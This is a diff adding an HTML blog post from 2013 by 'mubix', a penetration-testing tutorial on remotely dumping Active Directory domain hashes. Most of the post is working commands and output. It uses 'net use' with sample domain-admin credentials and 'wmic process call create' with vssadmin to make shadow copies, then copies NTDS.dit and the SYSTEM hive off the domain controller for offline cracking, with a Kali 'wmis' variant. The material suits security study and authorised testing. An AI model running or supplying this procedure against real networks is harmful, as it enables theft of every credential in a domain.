@@ -1,0 +1,293 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Volume Shadow Copy NTDS.dit Domain Hashes Remotely - Part 1 - Malicious Link - Blog by mubix - Rob Fuller</title><meta name="Description" content="This is a cool blog"><meta property="og:title" content="Volume Shadow Copy NTDS.dit Domain Hashes Remotely - Part 1" />
+<meta property="og:description" content="This and part 2 are mostly just an update to http://pauldotcom.com/2011/11/safely-dumping-hashes-from-liv.html but without the need for VSSOwn, that and we are doing it remotely without the need for shell on the DC.
+Ever run into a Domain Controller that wasn&rsquo;t allowed to talk to the Internet, had insane AV and GPOs not allowing anyone to RDP in (Even Domain Admins) unless they provided some kind of voodo happy dance? Ya me neither, but here is how you can still dump domain hashes and hash history if you run into that case." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://malicious.link/posts/2013/2013-06-10-volume-shadow-copy-ntdsdit-domain-hashes-remotely-part-1/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2013-06-10T13:11:03+00:00" />
+<meta property="article:modified_time" content="2013-06-10T13:11:03+00:00" /><meta property="og:site_name" content="My cool site" />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Volume Shadow Copy NTDS.dit Domain Hashes Remotely - Part 1"/>
+<meta name="twitter:description" content="This and part 2 are mostly just an update to http://pauldotcom.com/2011/11/safely-dumping-hashes-from-liv.html but without the need for VSSOwn, that and we are doing it remotely without the need for shell on the DC.
+Ever run into a Domain Controller that wasn&rsquo;t allowed to talk to the Internet, had insane AV and GPOs not allowing anyone to RDP in (Even Domain Admins) unless they provided some kind of voodo happy dance? Ya me neither, but here is how you can still dump domain hashes and hash history if you run into that case."/>
+<meta name="application-name" content="malicious.link">
+<meta name="apple-mobile-web-app-title" content="malicious.link"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://malicious.link/posts/2013/2013-06-10-volume-shadow-copy-ntdsdit-domain-hashes-remotely-part-1/" /><link rel="prev" href="https://malicious.link/posts/2013/2013-06-07-using-mimikatz-alpha-or-getting-clear-text-passwords-with-a/" /><link rel="next" href="https://malicious.link/posts/2013/2013-06-11-volume-shadow-copy-ntdsdit-domain-hashes-remotely-part-2/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Volume Shadow Copy NTDS.dit Domain Hashes Remotely - Part 1",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/malicious.link\/posts\/2013\/2013-06-10-volume-shadow-copy-ntdsdit-domain-hashes-remotely-part-1\/"
+        },"genre": "posts","wordcount":  811 ,
+        "url": "https:\/\/malicious.link\/posts\/2013\/2013-06-10-volume-shadow-copy-ntdsdit-domain-hashes-remotely-part-1\/","datePublished": "2013-06-10T13:11:03+00:00","dateModified": "2013-06-10T13:11:03+00:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "mubix"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Malicious Link - Blog by mubix - Rob Fuller"># malicious.link</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/about"> About </a><a class="menu-item" href="/brandon"> Brandon </a><a class="menu-item" href="/categories"> Categories </a><a class="menu-item" href="/posts"> Posts </a><a class="menu-item" href="/start"> Start </a><a class="menu-item" href="/tags"> Tags </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Malicious Link - Blog by mubix - Rob Fuller"># malicious.link</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/about" title="">About</a><a class="menu-item" href="/brandon" title="">Brandon</a><a class="menu-item" href="/categories" title="">Categories</a><a class="menu-item" href="/posts" title="">Posts</a><a class="menu-item" href="/start" title="">Start</a><a class="menu-item" href="/tags" title="">Tags</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Volume Shadow Copy NTDS.dit Domain Hashes Remotely - Part 1</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://twitter.com/mubix" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>mubix</a></span>&nbsp;<span class="post-category">included in <a href="/categories/shadowcopy/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>shadowcopy</a>&nbsp;<a href="/categories/cracking/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>cracking</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2013-06-10">2013-06-10</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;811 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;4 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents"></nav></div>
+            </div><div class="content" id="content"><blockquote>
+<p>This and part 2 are mostly just an update to <a href="http://pauldotcom.com/2011/11/safely-dumping-hashes-from-liv.html" target="_blank" rel="noopener noreffer ">http://pauldotcom.com/2011/11/safely-dumping-hashes-from-liv.html</a> but without the need for VSSOwn, that and we are doing it remotely without the need for shell on the DC.</p>
+</blockquote>
+<p>Ever run into a Domain Controller that wasn&rsquo;t allowed to talk to the Internet, had insane AV and GPOs not allowing anyone to RDP in (Even Domain Admins) unless they provided some kind of voodo happy dance? Ya me neither, but here is how you can still dump domain hashes and hash history if you run into that case. Lets start</p>
+<p>First authenticate to the domain controller and make sure you have a good working directory to use.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">net use \\DC1 /user:DOMAIN\domainadminsvc domainadminsvc123
+</span></span><span class="line"><span class="cl">dir \\DC1\C$
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Alright, lets say &ldquo;TEMP&rdquo; is there and it&rsquo;s empty on the remote DC. The way we are going to run commands will not allow us to get results directly so we are going to use a temp file on the DC in <code>C:\TEMP</code> where we already made sure is clear.</p>
+<p>We are going to be using Volume Shadow Copies to pull the NTDS.dit file (Active Directory&rsquo;s DB much like Window&rsquo;s SAM file except that it stores the entire AD set of objects there), we also need the SYSTEM registry hive. You can get the SAM registry hive as well but that will only get local DC credentials.</p>
+<p>So lets list the current volume shadow copies to see if we need to create one, from a Windows command prompt (or if you&rsquo;ve installed wmic for Linux via <a href="http://www.krenger.ch/blog/wmi-commands-from-linux/" target="_blank" rel="noopener noreffer ">http://www.krenger.ch/blog/wmi-commands-from-linux/</a> ) - this <em>IS</em> an interactive command so this won&rsquo;t work very nicely in a Meterpreter shell:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">C:\temp&gt;wmic /node:DC1 /user:DOMAIN\domainadminsvc /password:domainadminsvc123 process call create &#34;cmd /c vssadmin list shadows 2&gt;&amp;1 &gt; C:\tempoutput.txt&#34;
+</span></span><span class="line"><span class="cl">Executing (Win32_Process)-&gt;Create()
+</span></span><span class="line"><span class="cl">Method execution successful.
+</span></span><span class="line"><span class="cl">Out Parameters:
+</span></span><span class="line"><span class="cl">instance of __PARAMETERS
+</span></span><span class="line"><span class="cl">{
+</span></span><span class="line"><span class="cl">        ProcessId = 7304;
+</span></span><span class="line"><span class="cl">        ReturnValue = 0;
+</span></span><span class="line"><span class="cl">};
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>To break down this command:</p>
+<ul>
+<li><code>wmic /node:DC1</code> - tells it to interact with the WMI API on DC1</li>
+<li><code>/user:DOMAIN\domainadminsvc /password:domainadminsvc123</code> - authentication</li>
+<li><code>process call create</code> - WMI speak for create a process</li>
+<li><code>cmd /c</code> - vssadmin doesn&rsquo;t operate outside of cmd for some reason&hellip;</li>
+<li><code>vssadmin list shadows</code> - List any shadow volumes that already exist</li>
+<li><code>2&gt;&amp;1 &gt; C:\temp\output.txt</code> - Take STDIN and STDERROR and throw it in a text file on DC1 C:\TEMP. Make sure you specify full path because you will be executing from within C:\Windows\System32 and its a pain to find anything in that directory. So if you just specify &gt; bob.txt you get to hunt in C:\Windows\System32 or wherever WMI wants to execute you from for bob.txt</li>
+</ul>
+<p>Process starts and then you need to view the output file by either copying it down, <code>type \DC1\C$\TEMP\output.txt</code> or mount the C drive as a network share. Either way you should either see something like this:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">C:\temp&gt;type output.txt
+</span></span><span class="line"><span class="cl">vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
+</span></span><span class="line"><span class="cl">(C) Copyright 2001-2005 Microsoft Corp.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Contents of shadow copy set ID: {671090fd-0198}
+</span></span><span class="line"><span class="cl">   Contained 1 shadow copies at creation time: 5/31/2013 11:29:03 AM
+</span></span><span class="line"><span class="cl">      Shadow Copy ID: {0863e309}
+</span></span><span class="line"><span class="cl">         Original Volume: (C:)\\?\Volume{c44da10e-0154-11e1-b968-806e6f6e6963}\
+</span></span><span class="line"><span class="cl">         Shadow Copy Volume: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
+</span></span><span class="line"><span class="cl">         Originating Machine: wpad
+</span></span><span class="line"><span class="cl">         Service Machine: wpad
+</span></span><span class="line"><span class="cl">         Provider: &#39;Microsoft Software Shadow Copy provider 1.0&#39;
+</span></span><span class="line"><span class="cl">         Type: ClientAccessibleWriters
+</span></span><span class="line"><span class="cl">         Attributes: Persistent, Client-accessible, No auto release, Differential, Auto recovered
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>or</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">C:\temp&gt;type output.txt
+</span></span><span class="line"><span class="cl">vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
+</span></span><span class="line"><span class="cl">(C) Copyright 2001-2005 Microsoft Corp.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">No items found that satisfy the query
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>If there are no shadow copies or the ones there are too old (look at the creation time), you can create a shadow copy using the &lsquo;vssadmin create shadow /for=C: command. (This command only applies to Server OS (Win2k3/Win2k8) but since those are the only two that commonly have NTDS.dit files we don&rsquo;t have to remember this):</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">C:\temp&gt;wmic /node:DC1 /user:DOMAIN\domainadminsvc /password:domainadminsvc123 process call create &#34;cmd /c vssadmin create shadow /for=C: 2&gt;&amp;1 &gt; C:\temp\output.txt&#34;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The other thing to keep in mind is that NTDS.dit isn&rsquo;t always on the main drive. It is commonly on a &ldquo;D&rdquo; drive for safety if a HDD goes bad or something. But it should always be in a folder called NTDS. (By default this is C:WindowsNTDS)</p>
+<p>Next we just copy the files out of the shadow copies. First the SYSTEM hive:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">C:\temp&gt;wmic /node:DC1 /user:DOMAIN\domainadminsvc /password:domainadminsvc123 process call create &#34;cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\SYSTEM.hive 2&gt;&amp;1 &gt; C:\temp\output.txt&#34;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Then the NTDS.dit (notice this one isn&rsquo;t in System32):</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">C:\temp&gt;wmic /node:DC1 /user:DOMAIN\domainadminsvc /password:domainadminsvc123 process call create &#34;cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit C:\temp\NTDS.dit 2&gt;&amp;1 &gt; C:\temp\output.txt&#34;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>In Kali Linux you could use the WMIS package to do much the same thing:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">root@kali:~# wmis -U DOMAIN\domainadminsvc%domainadminsvc123 //DC1 cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit C:\temp\NTDS.dit 2&gt;&amp;1 &gt; C:\temp\output.txt
+</span></span><span class="line"><span class="cl">NTSTATUS: NT_STATUS_OK - Success
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Copy those files to your own system for offline extraction which I&rsquo;ll cover in part 2.</p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2013-06-10</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://malicious.link/posts/2013/2013-06-10-volume-shadow-copy-ntdsdit-domain-hashes-remotely-part-1/" data-title="Volume Shadow Copy NTDS.dit Domain Hashes Remotely - Part 1" data-via="mubix"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://malicious.link/posts/2013/2013-06-10-volume-shadow-copy-ntdsdit-domain-hashes-remotely-part-1/"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Linkedin" data-sharer="linkedin" data-url="https://malicious.link/posts/2013/2013-06-10-volume-shadow-copy-ntdsdit-domain-hashes-remotely-part-1/"><i class="fab fa-linkedin fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://malicious.link/posts/2013/2013-06-10-volume-shadow-copy-ntdsdit-domain-hashes-remotely-part-1/" data-title="Volume Shadow Copy NTDS.dit Domain Hashes Remotely - Part 1"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Reddit" data-sharer="reddit" data-url="https://malicious.link/posts/2013/2013-06-10-volume-shadow-copy-ntdsdit-domain-hashes-remotely-part-1/"><i class="fab fa-reddit fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="https://malicious.link/posts/2013/2013-06-10-volume-shadow-copy-ntdsdit-domain-hashes-remotely-part-1/" data-title="Volume Shadow Copy NTDS.dit Domain Hashes Remotely - Part 1"><i data-svg-src="https://cdn.jsdelivr.net/npm/simple-icons@7.3.0/icons/line.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://malicious.link/posts/2013/2013-06-10-volume-shadow-copy-ntdsdit-domain-hashes-remotely-part-1/" data-title="Volume Shadow Copy NTDS.dit Domain Hashes Remotely - Part 1"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Evernote" data-sharer="evernote" data-url="https://malicious.link/posts/2013/2013-06-10-volume-shadow-copy-ntdsdit-domain-hashes-remotely-part-1/" data-title="Volume Shadow Copy NTDS.dit Domain Hashes Remotely - Part 1"><i class="fab fa-evernote fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/2013/2013-06-07-using-mimikatz-alpha-or-getting-clear-text-passwords-with-a/" class="prev" rel="prev" title="Using Mimikatz Alpha or Getting Clear Text Passwords with a Microsoft Tool"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Using Mimikatz Alpha or Getting Clear Text Passwords with a Microsoft Tool</a>
+            <a href="/posts/2013/2013-06-11-volume-shadow-copy-ntdsdit-domain-hashes-remotely-part-2/" class="next" rel="next" title="Volume Shadow Copy NTDS.DIT Domain Hashes Remotely - Part 2">Volume Shadow Copy NTDS.DIT Domain Hashes Remotely - Part 2<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2005 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://twitter.com/mubix" target="_blank">Rob Fuller</a></span>&nbsp;|&nbsp;<span class="license">All Rights Reserved</span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":100},"comment":{},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
